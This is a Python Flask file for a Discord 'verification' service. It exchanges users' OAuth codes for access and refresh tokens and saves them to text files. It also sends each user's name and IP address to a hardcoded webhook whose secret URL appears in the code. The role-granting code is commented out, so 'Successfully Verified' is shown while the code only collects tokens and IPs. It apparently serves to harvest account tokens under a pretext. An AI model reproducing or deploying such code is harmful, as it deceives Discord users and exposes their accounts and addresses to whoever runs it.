from flask import Flask, request
from discord_webhook import DiscordWebhook, DiscordEmbed
import requests, discord, ctypes

ctypes.windll.kernel32.SetConsoleTitleW(f'App verify')

def get_access_token(code):

    API_ENDPOINT = 'https://discord.com/api/v10'
    CLIENT_ID = ''
    CLIENT_SECRET = ''
    REDIRECT_URI = ''
    BOTTOKEN = ''

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'Bot {BOTTOKEN}'
    }
    r = requests.post('%s/oauth2/token' % API_ENDPOINT, data=data, headers=headers).json()
    print(r)
    token = r['access_token']
    refresh = r['refresh_token']
    try:

        headers = {
            'Authorization': f'Bearer {token}'}
        r = requests.get('https://discordapp.com/api/users/@me', headers=headers).json()
        uid = r["id"]
        username = r['username']
    except Exception as e:
        print(e)
    return token, uid, refresh, username

app = Flask(__name__)

@app.route('/',methods = ['get'])
def main():
    code = request.args.get('code')
    guild = request.args.get('state')
    ip = request.remote_addr
    total = sum(1 for line in open('db.txt'))
    token, userID, refresh, username = get_access_token(code)
    BOTTOKEN = ''
    duplicate = open('db.txt', 'r').read()
    if userID in duplicate:
        return 'Already verified.'
    else:
        f = open("db.txt", "a")
        f.write(f'{token}:{userID}\n')
        f.close()

        f = open("refresh.txt", "a")
        f.write(f'{refresh}\n')
        f.close()

        guild = request.args.get('state')

        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1175489611389218837/y8uAcsB28OKK6emJqG4fdfoYxKY9UMia8UGgiCSuGKKoRrdvSuLqy8B-7_f9M6rlEf_b')
        embed = DiscordEmbed(title='New', description=f'Username: {username},  IP:  {ip}  Total:  {total}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
        #if guild == '1088173745966948424':
            #role = 1088174793225949255

        #headers={'authorization' : 'Bot '+BOTTOKEN}
        #r = requests.put(f'https://discord.com/api/v9/guilds/{guild}/members/{userID}/roles/{role}', headers=headers)
        return 'Successfully Verified'

if __name__ == '__main__':
    app.run(debug=False, host='', port=5000)